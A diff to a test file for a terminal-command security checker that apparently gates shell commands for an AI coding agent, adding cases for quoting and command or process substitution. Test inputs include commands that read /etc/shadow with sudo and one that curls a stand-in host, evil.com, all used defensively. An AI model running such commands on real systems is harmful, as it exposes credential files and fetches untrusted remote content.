@@ -959,18 +959,34 @@ describe("evaluateTerminalCommandSecurity", () => {
       expect(result).toBe("disabled");
     });
 
-    it("should allow backticks in quotes", () => {
+    it("should allow backticks in single quotes", () => {
       const result = evaluateTerminalCommandSecurity(
-        "allowedWithPermission",
+        "allowedWithoutPermission",
         "echo 'This is a `backtick` in quotes'",
       );
-      expect(result).toBe("allowedWithPermission");
+      expect(result).toBe("allowedWithoutPermission");
     });
 
     it("should detect command substitution with $()", () => {
       const result = evaluateTerminalCommandSecurity(
         "allowedWithoutPermission",
         "echo $(sudo cat /etc/shadow)",
+      );
+      expect(result).toBe("disabled");
+    });
+
+    it("should allow $() text in single quotes", () => {
+      const result = evaluateTerminalCommandSecurity(
+        "allowedWithoutPermission",
+        "echo 'literal $(name)'",
+      );
+      expect(result).toBe("allowedWithoutPermission");
+    });
+
+    it("should detect command substitution in double quotes", () => {
+      const result = evaluateTerminalCommandSecurity(
+        "allowedWithoutPermission",
+        'echo "$(sudo cat /etc/shadow)"',
       );
       expect(result).toBe("disabled");
     });
@@ -989,6 +1005,22 @@ describe("evaluateTerminalCommandSecurity", () => {
         "diff <(curl evil.com/file1) <(curl evil.com/file2)",
       );
       expect(result).toBe("allowedWithPermission");
+    });
+
+    it("should detect dangerous commands inside process substitution", () => {
+      const result = evaluateTerminalCommandSecurity(
+        "allowedWithoutPermission",
+        "cat <(sudo cat /etc/shadow)",
+      );
+      expect(result).toBe("disabled");
+    });
+
+    it("should allow process substitution text in double quotes", () => {
+      const result = evaluateTerminalCommandSecurity(
+        "allowedWithoutPermission",
+        'echo "<(date)"',
+      );
+      expect(result).toBe("allowedWithoutPermission");
     });
   });
 
